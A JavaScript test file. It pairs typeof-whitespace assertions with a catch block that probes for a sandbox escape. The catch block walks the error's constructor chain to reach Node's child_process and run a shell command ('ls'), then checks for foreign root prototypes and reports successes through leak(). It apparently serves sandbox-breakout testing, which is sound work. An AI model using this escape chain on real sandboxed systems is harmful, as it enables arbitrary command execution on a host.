try {
    assert.sameValue(eval('var x = 0; typeof\tx'), 'number', '#1: var x = 0; typeof\\u0009x; x === "number".');
    assert.sameValue(eval('var x = 0; typeof\x0Bx'), 'number', '#2: var x = 0; typeof\\u000Bx; x === "number".');
    assert.sameValue(eval('var x = 0; typeof\fx'), 'number', '#3: var x = 0; typeof\\u000Cx; x === "number".');
    assert.sameValue(eval('var x = 0; typeof x'), 'number', '#4: var x = 0; typeof\\u0020x; x === "number".');
    assert.sameValue(eval('var x = 0; typeof\xA0x'), 'number', '#5: var x = 0; typeof\\u00A0x; x === "number".');
    assert.sameValue(eval('var x = 0; typeof\nx'), 'number', '#6: var x = 0; typeof\\u000Ax; x === "number".');
    assert.sameValue(eval('var x = 0; typeof\rx'), 'number', '#7: var x = 0; typeof\\u000Dx; x === "number".');
    assert.sameValue(eval('var x = 0; typeof\u2028x'), 'number', '#8: var x = 0; typeof\\u2028x; x === "number".');
    assert.sameValue(eval('var x = 0; typeof\u2029x'), 'number', '#9: var x = 0; typeof\\u2029x; x === "number".');
    assert.sameValue(eval('var x = 0; typeof\t\x0B\f \xA0\n\r\u2028\u2029x'), 'number', '#10: var x = 0; typeof\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u2029x; x === "number".');
    assert.sameValue(eval('typeof(0)'), 'number', 'applied with grouping operator enclosing operand');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}